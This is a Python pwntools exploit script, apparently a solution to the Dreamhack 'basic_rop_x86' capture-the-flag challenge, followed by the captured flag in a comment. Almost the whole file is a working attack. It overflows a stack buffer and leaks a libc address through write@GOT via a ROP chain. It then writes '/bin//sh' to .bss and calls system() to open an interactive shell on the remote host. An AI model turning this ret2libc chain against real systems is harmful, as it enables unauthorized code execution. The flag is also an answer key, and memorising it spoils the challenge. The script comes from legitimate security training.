from pwn import * 

local = 1

if local == 0:
	p = process("./basic_rop_x86")
else :
	p = remote("host1.dreamhack.games",8473)

pppr = 0x08048689
read_got = 0x0804a00c
read_plt = 0x80483f0
write_got = 0x0804a024
write_plt = 0x08048450
main = 0x080485d9
bss = 0x804a100

if local == 0 : 
	write_offset = 0xe6ea0
	system_offset = 0x3d250
else :
	write_offset = 0xd43c0
	system_offset = 0x3a940


payload1 = ""
payload1 += "a"*0x44
payload1 += "b"*4

payload1 += p32(write_plt)
payload1 += p32(pppr)
payload1 += p32(1)
payload1 += p32(write_got)
payload1 += p32(4)

payload1 += p32(read_plt)
payload1 += p32(pppr)
payload1 += p32(0)
payload1 += p32(bss)
payload1 += p32(8)


payload1 += p32(main)
p.sendline(payload1)

p.recv(0x44)

recv = u32(p.recv(4))
libc_base = recv-write_offset
log.info(hex(libc_base))

# sleep(0.1)

# p.recv()
p.send("/bin//sh")

payload2 = ""
payload2 += "a"*0x44
payload2 += "b"*0x4

system = libc_base+system_offset
log.info(hex(system))


payload2 += p32(system)
payload2 += "aaaa"
payload2 += p32(bss)
payload2 += p32(0)
payload2 += p32(0)
pause()
p.sendline(payload2)

p.interactive()

#DH{ff3976e1fcdb03267e8d1451e56b90a5}
